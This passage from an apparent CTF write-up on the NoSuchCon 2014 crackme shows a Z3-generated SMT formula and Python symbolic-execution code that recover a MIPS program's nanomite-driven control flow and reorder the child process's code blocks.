</span><span class='line'>(let ((?x235 (bvxor (bvadd ((_ extract 25 14) (bvadd (concat ?x187 ((_ extract 31 10) ?x177)) ?x42)) ?x233) ?x233)))
</span><span class='line'>(let ((?x244 (bvadd (_ bv122326 18) (concat (bvnot (bvadd ?x235 (bvmul (_ bv4095 12) ?x233))) (bvnot ((_ extract 31 26) ?x79))) ?x144)))
</span><span class='line'>(let ((?x246 (bvadd (bvnot ?x244) ?x144)))
</span><span class='line'>(let ((?x293 (concat (bvnot ((_ extract 24 23) ?x173)) ((_ extract 22 18) ?x173) ((_ extract 17 17) ?x246) (bvnot ((_ extract 16 16) ?x246)) ((_ extract 15 15) ?x246) (bvnot ((_ extract 14 12) ?x246)) ((_ extract 11 10) ?x246) (bvnot ((_ extract 9 9) ?x246)) ((_ extract 8 8) ?x246) (bvnot ((_ extract 7 7) ?x246)) ((_ extract 6 6) ?x246) (bvnot ((_ extract 5 4) ?x246)) (bvnot ?x253) ?x255 (bvnot (bvadd (bvnot (bvadd (_ bv2 2) (bvnot ((_ extract 27 26) ?x79)) ?x120)) ?x120)) (bvnot ((_ extract 31 29) ?x173)) ((_ extract 28 28) ?x173) (bvnot ((_ extract 27 26) ?x173)) ((_ extract 25 25) ?x173))))
</span><span class='line'>(let ((?x324 (bvor ((_ extract 0 0) (bvshl ?x293 (bvadd (_ bv1 32) ?x27))) ((_ extract 0 0) (bvlshr ?x293 ?x24)))))
</span><span class='line'>(let ((?x202 (bvadd (bvor (bvshl ?x293 (bvadd (_ bv1 32) ?x27)) (bvlshr ?x293 ?x24)) ?x27)))
</span><span class='line'>(let ((?x261 (concat ((_ extract 31 31) ?x202) (bvnot ((_ extract 30 29) ?x202)) ((_ extract 28 27) ?x202) (bvnot ((_ extract 26 25) ?x202)) ((_ extract 24 22) ?x202) (bvnot ((_ extract 21 18) ?x202)) ((_ extract 17 17) ?x202) (bvnot ((_ extract 16 15) ?x202)) ((_ extract 14 13) ?x202) (bvnot ((_ extract 12 12) ?x202)) ((_ extract 11 7) ?x202) (bvnot ((_ extract 6 5) ?x202)) ((_ extract 4 2) ?x202) (bvnot ((_ extract 1 1) ?x202)) (bvadd ?x324 ?x67))))
</span><span class='line'>(let ((?x250 (concat ((_ extract 11 7) ?x202) (bvnot ((_ extract 6 5) ?x202)) ((_ extract 4 2) ?x202) (bvnot ((_ extract 1 1) ?x202)) (bvadd ?x324 ?x67))))
</span><span class='line'>(let ((?x331 (bvadd (_ bv1397077939 32) (concat (bvadd (_ bv4018 12) ?x250) ((_ extract 31 12) (bvadd (_ bv1471406002 32) ?x261))) ?x27)))
</span><span class='line'>(let ((?x264 (bvor (bvshl (bvadd (bvnot ?x331) ?x27) (bvadd (_ bv1 32) ?x27)) (bvlshr (bvadd (bvnot ?x331) ?x27) ?x24))))
</span><span class='line'>(let ((?x298 (bvor (bvshl (bvadd (_ bv1031407080 32) ?x264 ?x42) (bvadd (_ bv1 32) ?x27)) (bvlshr (bvadd (_ bv1031407080 32) ?x264 ?x42) ?x24))))
</span><span class='line'>(let ((?x231 (bvor ((_ extract 31 17) (bvshl ?x298 (bvadd (_ bv1 32) ?x27))) ((_ extract 31 17) (bvlshr ?x298 ?x24)))))
</span><span class='line'>(let ((?x220 (bvor ((_ extract 16 0) (bvshl ?x298 (bvadd (_ bv1 32) ?x27))) ((_ extract 16 0) (bvlshr ?x298 ?x24)))))
</span><span class='line'>(let ((?x283 (bvor (bvshl (concat ?x220 ?x231) (bvadd (_ bv1 32) ?x27)) (bvlshr (concat ?x220 ?x231) ?x24))))
</span><span class='line'>(let ((?x119 (bvadd (_ bv4200859627 32) (bvnot (bvor (bvshl ?x283 (bvadd (_ bv1 32) ?x27)) (bvlshr ?x283 ?x24))))))
</span><span class='line'>(let ((?x201 (bvshl ?x119 ?x24)))
</span><span class='line'>(let ((?x405 (bvadd (bvor ((_ extract 10 8) (bvlshr ?x119 (bvadd (_ bv1 32) ?x27))) ((_ extract 10 8) ?x201)) ((_ extract 8 6) ?x8))))
</span><span class='line'>(let ((?x343 (concat (bvor ((_ extract 7 0) (bvlshr ?x119 (bvadd (_ bv1 32) ?x27))) ((_ extract 7 0) ?x201)) (bvor ((_ extract 31 8) (bvlshr ?x119 (bvadd (_ bv1 32) ?x27))) ((_ extract 31 8) ?x201)))))
</span><span class='line'>(let ((?x199 (bvadd (_ bv752876532 32) (bvnot (bvadd ?x343 ?x27)) ?x27)))
</span><span class='line'>(let ((?x409 (concat ((_ extract 31 29) ?x199) (bvnot ((_ extract 28 28) ?x199)) ((_ extract 27 27) ?x199) (bvnot ((_ extract 26 26) ?x199)) ((_ extract 25 25) ?x199) (bvnot ((_ extract 24 24) ?x199)) ((_ extract 23 23) ?x199) (bvnot ((_ extract 22 22) ?x199)) ((_ extract 21 21) ?x199) (bvnot ((_ extract 20 19) ?x199)) ((_ extract 18 18) ?x199) (bvnot ((_ extract 17 17) ?x199)) ((_ extract 16 16) ?x199) (bvnot ((_ extract 15 15) ?x199)) ((_ extract 14 11) ?x199) (bvnot ((_ extract 10 10) ?x199)) ((_ extract 9 9) ?x199) (bvnot ((_ extract 8 7) ?x199)) ((_ extract 6 6) ?x199) (bvnot ((_ extract 5 4) ?x199)) ((_ extract 3 3) ?x199) (bvnot (bvadd (_ bv4 3) (bvnot ?x405) ((_ extract 8 6) ?x8))))))
</span><span class='line'>(let ((?x342 (bvlshr (bvadd (_ bv330202175 32) ?x409) ?x24)))
</span><span class='line'>(let ((?x20 (bvadd (_ bv1 32) ?x27)))
</span><span class='line'>(let ((?x337 (bvshl (bvadd (_ bv330202175 32) ?x409) ?x20)))
</span><span class='line'>(let ((?x354 (bvadd (_ bv651919116 32) (bvor ?x337 ?x342))))
</span><span class='line'>(let ((?x414 (concat (bvnot ((_ extract 26 26) ?x354)) ((_ extract 25 25) ?x354) (bvnot ((_ extract 24 24) ?x354)) (bvnot ((_ extract 23 23) ?x354)) ((_ extract 22 22) ?x354) (bvnot ((_ extract 21 21) ?x354)) (bvnot ((_ extract 20 18) ?x354)) ((_ extract 17 13) ?x354) (bvnot ((_ extract 12 10) ?x354)) ((_ extract 9 8) ?x354) (bvnot ((_ extract 7 7) ?x354)) ((_ extract 6 5) ?x354) (bvnot ((_ extract 4 4) ?x354)) (bvnot ((_ extract 3 3) ?x354)) (bvnot ((_ extract 2 2) ?x354)) (bvor ((_ extract 1 1) ?x337) ((_ extract 1 1) ?x342)) (bvnot (bvor ((_ extract 0 0) ?x337) ((_ extract 0 0) ?x342))) (bvnot ((_ extract 31 31) ?x354)) ((_ extract 30 30) ?x354) (bvnot ((_ extract 29 28) ?x354)) ((_ extract 27 27) ?x354))))
</span><span class='line'>(let ((?x464 (concat ((_ extract 22 22) ?x354) (bvnot ((_ extract 21 21) ?x354)) (bvnot ((_ extract 20 18) ?x354)) ((_ extract 17 13) ?x354) (bvnot ((_ extract 12 10) ?x354)) ((_ extract 9 8) ?x354) (bvnot ((_ extract 7 7) ?x354)) ((_ extract 6 5) ?x354) (bvnot ((_ extract 4 4) ?x354)) (bvnot ((_ extract 3 3) ?x354)) (bvnot ((_ extract 2 2) ?x354)) (bvor ((_ extract 1 1) ?x337) ((_ extract 1 1) ?x342)) (bvnot (bvor ((_ extract 0 0) ?x337) ((_ extract 0 0) ?x342))) (bvnot ((_ extract 31 31) ?x354)) ((_ extract 30 30) ?x354) (bvnot ((_ extract 29 28) ?x354)) ((_ extract 27 27) ?x354))))
</span><span class='line'>(let ((?x474 (concat (bvadd (_ bv141595581 28) (bvnot (bvxor (bvadd (_ bv178553293 28) ?x464) (concat (_ bv0 2) ?x26)))) ((_ extract 31 28) (bvadd (_ bv4168127421 32) (bvnot (bvxor (bvadd (_ bv2594472397 32) ?x414) ?x27)))))))
</span><span class='line'>(let ((?x495 (bvadd (_ bv1994801052 32) (bvxor (_ bv1407993787 32) (bvor (bvshl ?x474 ?x20) (bvlshr ?x474 ?x24)) ?x27) ?x42)))
</span><span class='line'>(let ((?x392 (concat (bvor ((_ extract 13 0) (bvlshr ?x495 ?x20)) ((_ extract 13 0) (bvshl ?x495 ?x24))) (bvor ((_ extract 31 14) (bvlshr ?x495 ?x20)) ((_ extract 31 14) (bvshl ?x495 ?x24))))))
</span><span class='line'>(let ((?x388 (bvlshr ?x392 ?x24)))
</span><span class='line'>(let ((?x494 (concat (bvnot (bvor ((_ extract 31 31) (bvshl ?x392 ?x20)) ((_ extract 31 31) ?x388))) (bvor ((_ extract 30 30) (bvshl ?x392 ?x20)) ((_ extract 30 30) ?x388)) (bvnot (bvor ((_ extract 29 27) (bvshl ?x392 ?x20)) ((_ extract 29 27) ?x388))) (bvor ((_ extract 26 25) (bvshl ?x392 ?x20)) ((_ extract 26 25) ?x388)) (bvnot (bvor ((_ extract 24 23) (bvshl ?x392 ?x20)) ((_ extract 24 23) ?x388))) (bvor ((_ extract 22 21) (bvshl ?x392 ?x20)) ((_ extract 22 21) ?x388)) (bvnot (bvor ((_ extract 20 16) (bvshl ?x392 ?x20)) ((_ extract 20 16) ?x388))) (bvor ((_ extract 15 15) (bvshl ?x392 ?x20)) ((_ extract 15 15) ?x388)) (bvnot (bvor ((_ extract 14 14) (bvshl ?x392 ?x20)) ((_ extract 14 14) ?x388))) (bvor ((_ extract 13 12) (bvshl ?x392 ?x20)) ((_ extract 13 12) ?x388)) (bvnot (bvor ((_ extract 11 10) (bvshl ?x392 ?x20)) ((_ extract 11 10) ?x388))) (bvor ((_ extract 9 8) (bvshl ?x392 ?x20)) ((_ extract 9 8) ?x388)) (bvnot (bvor ((_ extract 7 2) (bvshl ?x392 ?x20)) ((_ extract 7 2) ?x388))) (bvor ((_ extract 1 1) (bvshl ?x392 ?x20)) ((_ extract 1 1) ?x388)) (bvnot (bvor ((_ extract 0 0) (bvshl ?x392 ?x20)) ((_ extract 0 0) ?x388))))))
</span><span class='line'>(let ((?x450 (bvor (bvlshr ?x494 ?x20) (bvshl ?x494 ?x24))))
</span><span class='line'>(bvor (bvlshr ?x450 ?x20) (bvshl ?x450 ?x24)))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))
</span></code></pre></td></tr></table></div></figure>


<p>Quite happy we don&rsquo;t have to study that right?</p>

<h3>Extracting the function that generates the new program counter from the second magic value</h3>

<p>For the second big block of code, we can do exactly the same thing: copy the code, configure the virtual environment with our symbolic variables and wrap the function:</p>

<figure class='code'><figcaption><span>solve_nsc2014_step1_z3.py@generate_new_pc_from_magic_high/extract_equation_of_function_that_generates_new_son_pc</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">def</span> <span class="nf">extract_equation_of_function_that_generates_new_son_pc</span><span class="p">():</span>
</span><span class='line'>  <span class="sd">&#39;&#39;&#39;Extract the formula of the function generating the new son&#39;s $pc&#39;&#39;&#39;</span>
</span><span class='line'>  <span class="n">x</span> <span class="o">=</span> <span class="n">mini_mips_symexec_engine</span><span class="o">.</span><span class="n">MiniMipsSymExecEngine</span><span class="p">(</span><span class="s">&#39;function_that_generates_new_son_pc.log&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">x</span><span class="o">.</span><span class="n">debug</span> <span class="o">=</span> <span class="bp">False</span>
</span><span class='line'>  <span class="n">x</span><span class="o">.</span><span class="n">enable_z3</span> <span class="o">=</span> <span class="bp">True</span>
</span><span class='line'>  <span class="n">tmp_pc</span> <span class="o">=</span> <span class="n">BitVec</span><span class="p">(</span><span class="s">&#39;magic&#39;</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span>
</span><span class='line'>  <span class="n">n_loop</span> <span class="o">=</span> <span class="n">BitVec</span><span class="p">(</span><span class="s">&#39;n_loop&#39;</span><span class="p">,</span> <span class="mi">32</span><span class="p">)</span>
</span><span class='line'>  <span class="n">x</span><span class="o">.</span><span class="n">stack</span><span class="p">[</span><span class="s">&#39;tmp_pc&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">tmp_pc</span>
</span><span class='line'>  <span class="n">x</span><span class="o">.</span><span class="n">stack</span><span class="p">[</span><span class="s">&#39;var_2F0&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">n_loop</span>
</span><span class='line'>  <span class="n">emu_generate_new_pc_for_son</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">print_final_state</span> <span class="o">=</span> <span class="bp">False</span><span class="p">)</span>
</span><span class='line'>  <span class="n">compute_pc_equation</span> <span class="o">=</span> <span class="n">simplify</span><span class="p">(</span><span class="n">x</span><span class="o">.</span><span class="n">gpr</span><span class="p">[</span><span class="s">&#39;v0&#39;</span><span class="p">])</span>
</span><span class='line'>  <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s">&#39;formulas&#39;</span><span class="p">,</span> <span class="s">&#39;generate_new_pc_son.smt2&#39;</span><span class="p">),</span> <span class="s">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span><span class='line'>    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">to_SMT2</span><span class="p">(</span><span class="n">compute_pc_equation</span><span class="p">,</span> <span class="n">name</span> <span class="o">=</span> <span class="s">&#39;generate_new_pc_son&#39;</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="n">tmp_pc</span><span class="p">,</span> <span class="n">n_loop</span><span class="p">,</span> <span class="n">compute_pc_equation</span>
</span><span class='line'>
</span><span class='line'><span class="n">var_new_pc</span><span class="p">,</span> <span class="n">var_n_loop</span><span class="p">,</span> <span class="n">expr_new_pc</span> <span class="o">=</span> <span class="p">[</span><span class="bp">None</span><span class="p">]</span><span class="o">*</span><span class="mi">3</span>
</span><span class='line'><span class="k">def</span> <span class="nf">generate_new_pc_from_magic_high</span><span class="p">(</span><span class="n">magic_high</span><span class="p">,</span> <span class="n">n_loop</span><span class="p">):</span>
</span><span class='line'>  <span class="k">global</span> <span class="n">var_new_pc</span><span class="p">,</span> <span class="n">var_n_loop</span><span class="p">,</span> <span class="n">expr_new_pc</span>
</span><span class='line'>  <span class="k">if</span> <span class="n">var_new_pc</span> <span class="ow">is</span> <span class="bp">None</span> <span class="ow">and</span> <span class="n">var_n_loop</span> <span class="ow">is</span> <span class="bp">None</span> <span class="ow">and</span> <span class="n">expr_new_pc</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
</span><span class='line'>    <span class="n">var_new_pc</span><span class="p">,</span> <span class="n">var_n_loop</span><span class="p">,</span> <span class="n">expr_new_pc</span> <span class="o">=</span> <span class="n">extract_equation_of_function_that_generates_new_son_pc</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">return</span> <span class="n">substitute</span><span class="p">(</span>
</span><span class='line'>      <span class="n">expr_new_pc</span><span class="p">,</span>
</span><span class='line'>      <span class="p">(</span><span class="n">var_new_pc</span><span class="p">,</span> <span class="n">BitVecVal</span><span class="p">(</span><span class="n">magic_high</span><span class="p">,</span> <span class="mi">32</span><span class="p">)),</span>
</span><span class='line'>      <span class="p">(</span><span class="n">var_n_loop</span><span class="p">,</span> <span class="n">BitVecVal</span><span class="p">(</span><span class="n">n_loop</span><span class="p">,</span> <span class="mi">32</span><span class="p">))</span>
</span><span class='line'>  <span class="p">)</span><span class="o">.</span><span class="n">as_long</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>If you are interested in what the formula looks like, it is also available in the <a href="https://github.com/0vercl0k/stuffz/tree/master/NoSuchCon2014">NoSuchCon2014 folder</a> on my <a href="https://github.com/0vercl0k">github</a>.</p>

<h3>Putting it all together: building a function that computes the new program counter of the son</h3>

<p>Obviously, we don&rsquo;t really care about those two previous functions, we just want to combine them together to implement the computation of the new program counter from both the round number &amp; where the son <em>SIGTRAP</em>&rsquo;d. The only missing bits is the lookup in the <em>QWORD</em>s array to extract the <em>second magic value</em>. We just have to dump the array inside another file called <em>memory.py</em>. This is done with a simple IDA Python one-liner:</p>

<figure class='code'><figcaption><span>Dump the QWORD array with IDAPy</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">values</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">((</span><span class="mh">0x00414130</span><span class="o">+</span><span class="n">i</span><span class="o">*</span><span class="mi">8</span><span class="p">,</span> <span class="n">Qword</span><span class="p">(</span><span class="mh">0x00414130</span><span class="o">+</span><span class="n">i</span><span class="o">*</span><span class="mi">8</span><span class="p">))</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x25E</span><span class="p">))</span>
</span></code></pre></td></tr></table></div></figure>


<p>Now, we can build the whole function easily by combining all those pieces:</p>

<figure class='code'><figcaption><span>solve_nsc2014_step1_z3.py@generate_new_pc_from_pc_son_using_z3</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">def</span> <span class="nf">generate_new_pc_from_pc_son_using_z3</span><span class="p">(</span><span class="n">pc_son</span><span class="p">,</span> <span class="n">n_break</span><span class="p">):</span>
</span><span class='line'>  <span class="sd">&#39;&#39;&#39;Generate the new program counter from the address where the son SIGTRAP&#39;d and</span>
</span><span class='line'><span class="sd">  the number of SIGTRAP the son encountered&#39;&#39;&#39;</span>
</span><span class='line'>  <span class="n">loop_n</span> <span class="o">=</span> <span class="p">(</span><span class="n">n_break</span> <span class="o">/</span> <span class="mi">101</span><span class="p">)</span>
</span><span class='line'>  <span class="n">magic</span> <span class="o">=</span> <span class="n">generate_magic_from_son_pc_using_z3</span><span class="p">(</span><span class="n">pc_son</span><span class="p">,</span> <span class="n">n_break</span><span class="p">)</span>
</span><span class='line'>  <span class="n">idx</span> <span class="o">=</span> <span class="bp">None</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">memory</span><span class="o">.</span><span class="n">pcs</span><span class="p">)):</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">memory</span><span class="o">.</span><span class="n">pcs</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span> <span class="o">==</span> <span class="n">magic</span><span class="p">:</span>
</span><span class='line'>      <span class="n">idx</span> <span class="o">=</span> <span class="n">i</span>
</span><span class='line'>      <span class="k">break</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">assert</span><span class="p">(</span><span class="n">idx</span> <span class="o">!=</span> <span class="bp">None</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">generate_new_pc_from_magic_high</span><span class="p">(</span><span class="n">memory</span><span class="o">.</span><span class="n">pcs</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="p">,</span> <span class="n">loop_n</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Sweet. Really sweet.</p>

<p>This basically means we are now able to <em>unscramble</em> the code of the son and reordering it completely without even physically running the binary nor generating traces.</p>

<h2>Unscramble the code like a sir</h2>

<p>Before showing, the code I just want to explain the process one more time:</p>

<ol>
<li> The son executes some code until it reaches a <em>break</em> instruction</li>
<li> The father gets the <em>$pc</em> of the son and the variable that counts the number of <em>break</em> instruction the son executed</li>
<li> The father generates a new <em>$pc</em> value from those two variables</li>
<li> The father sets the new <em>$pc</em></li>
<li> The father continues its son</li>
<li> Goto 1!</li>
</ol>


<p>So basically to unscramble the code, we just need to simulate what the father would do &amp; log everything somewhere. Couple of important details though:</p>

<ul>
<li>There are exactly 101 <em>break</em> instructions in the son, so 101 <em>chunks</em> of code will be executed and need to be <em>reordered</em>,</li>
<li>The son is executing 6 <em>rounds</em> ; that&rsquo;s exactly why the <em>QWORD</em> array has 6*101 entries.</li>
</ul>


<p>Here is the function I used:</p>

<figure class='code'><figcaption><span>solve_nsc2014_step1_z3.py@generate_son_code_reordered</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">def</span> <span class="nf">generate_son_code_reordered</span><span class="p">(</span><span class="n">debug</span> <span class="o">=</span> <span class="bp">False</span><span class="p">):</span>
</span><span class='line'>    <span class="sd">&#39;&#39;&#39;This functions puts in the right order the son&#39;s block of codes without</span>
</span><span class='line'><span class="sd">    relying on the father to set a new $pc value when a break is executed in the son.</span>
</span><span class='line'><span class="sd">    With this output we are good to go to create a nanomites-less binary:</span>
</span><span class='line'><span class="sd">      - We don&#39;t need the father anymore (he was driving the son)</span>
</span><span class='line'><span class="sd">      - We have the code in the right order, so we can also remove the break instructions</span>
</span><span class='line'><span class="sd">    It will also be quite useful when we want to execute symbolic-ly its code.</span>
</span><span class='line'><span class="sd">    &#39;&#39;&#39;</span>
</span><span class='line'>    <span class="k">def</span> <span class="nf">parse_line</span><span class="p">(</span><span class="n">l</span><span class="p">):</span>
</span><span class='line'>        <span class="n">addr_seg</span><span class="p">,</span> <span class="n">instr</span><span class="p">,</span> <span class="n">_</span> <span class="o">=</span> <span class="n">l</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="bp">None</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>
</span><span class='line'>        <span class="n">_</span><span class="p">,</span> <span class="n">addr</span> <span class="o">=</span> <span class="n">addr_seg</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&#39;:&#39;</span><span class="p">)</span>
</span><span class='line'>        <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="s">&#39;0x</span><span class="si">%s</span><span class="s">&#39;</span> <span class="o">%</span> <span class="n">addr</span><span class="p">,</span> <span class="mi">0</span><span class="p">),</span> <span class="n">instr</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">son_code</span> <span class="o">=</span> <span class="n">code</span><span class="o">.</span><span class="n">block_code_of_son</span>
</span><span class='line'>    <span class="n">next_break</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>    <span class="n">n_break</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>    <span class="n">cleaned_code</span> <span class="o">=</span> <span class="p">[]</span>
</span><span class='line'>    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>
</span><span class='line'>        <span class="k">for</span> <span class="n">z</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">101</span><span class="p">):</span>
</span><span class='line'>            <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>            <span class="k">while</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">son_code</span><span class="p">):</span>
</span><span class='line'>                <span class="n">line</span> <span class="o">=</span> <span class="n">son_code</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
</span><span class='line'>                <span class="n">addr</span><span class="p">,</span> <span class="n">instr</span> <span class="o">=</span> <span class="n">parse_line</span><span class="p">(</span><span class="n">line</span><span class="p">)</span>
</span><span class='line'>                <span class="k">if</span> <span class="n">instr</span> <span class="o">==</span> <span class="s">&#39;break&#39;</span> <span class="ow">and</span> <span class="p">(</span><span class="n">next_break</span> <span class="o">==</span> <span class="n">addr</span> <span class="ow">or</span> <span class="n">z</span> <span class="o">==</span> <span class="mi">0</span><span class="p">):</span>
</span><span class='line'>                    <span class="n">break_addr</span> <span class="o">=</span> <span class="n">addr</span>
</span><span class='line'>                    <span class="n">new_pc</span> <span class="o">=</span> <span class="n">generate_new_pc_from_pc_son_using_z3</span><span class="p">(</span><span class="n">break_addr</span><span class="p">,</span> <span class="n">n_break</span><span class="p">)</span>
</span><span class='line'>                    <span class="n">n_break</span> <span class="o">+=</span> <span class="mi">1</span>
</span><span class='line'>                    <span class="k">if</span> <span class="n">debug</span><span class="p">:</span>
</span><span class='line'>                        <span class="k">print</span> <span class="s">&#39;; Found the </span><span class="si">%d</span><span class="s">th break (@</span><span class="si">%.8x</span><span class="s">) ; new pc will be </span><span class="si">%.8x</span><span class="s">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">z</span><span class="p">,</span> <span class="n">break_addr</span><span class="p">,</span> <span class="n">new_pc</span><span class="p">)</span>
</span><span class='line'>                    <span class="n">state</span> <span class="o">=</span> <span class="s">&#39;Begin&#39;</span>
</span><span class='line'>                    <span class="n">block</span> <span class="o">=</span> <span class="p">[]</span>
</span><span class='line'>                    <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>                    <span class="k">while</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">son_code</span><span class="p">):</span>
</span><span class='line'>                        <span class="n">line</span> <span class="o">=</span> <span class="n">son_code</span><span class="p">[</span><span class="n">j</span><span class="p">]</span>
</span><span class='line'>                        <span class="n">addr</span><span class="p">,</span> <span class="n">instr</span> <span class="o">=</span> <span class="n">parse_line</span><span class="p">(</span><span class="n">line</span><span class="p">)</span>
</span><span class='line'>                        <span class="k">if</span> <span class="n">state</span> <span class="o">==</span> <span class="s">&#39;Begin&#39;</span><span class="p">:</span>
</span><span class='line'>                            <span class="k">if</span> <span class="n">addr</span> <span class="o">==</span> <span class="n">new_pc</span><span class="p">:</span>
</span><span class='line'>                                <span class="n">block</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">line</span><span class="p">)</span>
</span><span class='line'>                                <span class="n">state</span> <span class="o">=</span> <span class="s">&#39;Log&#39;</span>
</span><span class='line'>                        <span class="k">elif</span> <span class="n">state</span> <span class="o">==</span> <span class="s">&#39;Log&#39;</span><span class="p">:</span>
</span><span class='line'>                            <span class="k">if</span> <span class="n">instr</span> <span class="o">==</span> <span class="s">&#39;break&#39;</span><span class="p">:</span>
</span><span class='line'>                                <span class="n">next_break</span> <span class="o">=</span> <span class="n">addr</span>
</span><span class='line'>                                <span class="n">state</span> <span class="o">=</span> <span class="s">&#39;End&#39;</span>
</span><span class='line'>                            <span class="k">else</span><span class="p">:</span>
</span><span class='line'>                                <span class="n">block</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">line</span><span class="p">)</span>
</span><span class='line'>                        <span class="k">elif</span> <span class="n">state</span> <span class="o">==</span> <span class="s">&#39;End&#39;</span><span class="p">:</span>
</span><span class='line'>                            <span class="k">break</span>
</span><span class='line'>                        <span class="k">else</span><span class="p">:</span>
</span><span class='line'>                            <span class="k">pass</span>
</span><span class='line'>                        <span class="n">j</span> <span class="o">+=</span> <span class="mi">1</span>
</span><span class='line'>
